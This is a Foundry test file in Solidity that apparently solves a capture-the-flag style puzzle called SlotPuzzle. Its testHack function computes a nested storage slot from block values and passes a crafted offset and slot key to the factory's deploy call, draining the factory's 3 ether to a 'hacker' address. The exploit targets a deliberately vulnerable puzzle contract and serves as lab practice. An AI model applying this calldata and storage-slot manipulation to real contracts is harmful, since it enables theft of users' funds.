// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import {SlotPuzzle} from "src/SlotPuzzle.sol";
import {SlotPuzzleFactory} from "src/SlotPuzzleFactory.sol";
import {Parameters, Recipients} from "src/interface/ISlotPuzzleFactory.sol";

contract SlotPuzzleTest is Test {
    SlotPuzzle public slotPuzzle;

    SlotPuzzleFactory public slotPuzzleFactory;
    address hacker;

    function setUp() public {
        slotPuzzleFactory = new SlotPuzzleFactory{value: 3 ether}();
        hacker = makeAddr("hacker");
    }

    function testHack() public {
        vm.startPrank(hacker, hacker);
        assertEq(
            address(slotPuzzleFactory).balance,
            3 ether,
            "weth contract should have 3 ether"
        );

        //hack time

        Recipients[] memory recipients = new Recipients[](3);
        recipients[0] = Recipients({account: address(hacker), amount: 1 ether});
        recipients[1] = Recipients({account: address(hacker), amount: 1 ether});
        recipients[2] = Recipients({account: address(hacker), amount: 1 ether});
        bytes32 slot = getSlot();
        slotPuzzleFactory.deploy(
            Parameters({
                totalRecipients: 3,
                offset: 0x1c4,
                recipients: recipients,
                slotKey: abi.encode(slot, uint256(0x124))
            })
        );

        assertEq(
            address(slotPuzzleFactory).balance,
            0,
            "weth contract should have 0 ether"
        );
        assertEq(
            address(hacker).balance,
            3 ether,
            "hacker should have 3 ether"
        );

        vm.stopPrank();
    }

    function getSlot() public view returns (bytes32) {
        bytes32 slot1 = keccak256(
            abi.encode(
                uint256(block.number),
                keccak256(abi.encode(address(hacker), uint256(1))) // hacker will be tx.origin
            )
        );
        bytes32 slot2 = keccak256(
            abi.encode(
                address(slotPuzzleFactory), // msg.sender will be factory contract
                keccak256(
                    abi.encode(uint256(block.timestamp), uint256(slot1) + 1)
                )
            )
        );
        bytes32 slot3 = keccak256(
            abi.encode(
                address(block.coinbase),
                keccak256(
                    abi.encode(uint256(block.prevrandao), uint256(slot2) + 1)
                )
            )
        );
        bytes32 slot4 = keccak256(
            abi.encode(
                address(
                    uint160(uint256(blockhash(block.number - block.basefee)))
                ),
                keccak256(
                    abi.encode(uint256(block.chainid), uint256(slot3) + 1)
                )
            )
        );

        bytes32 slot5 = keccak256(abi.encode(slot4));
        return slot5;
    }
}
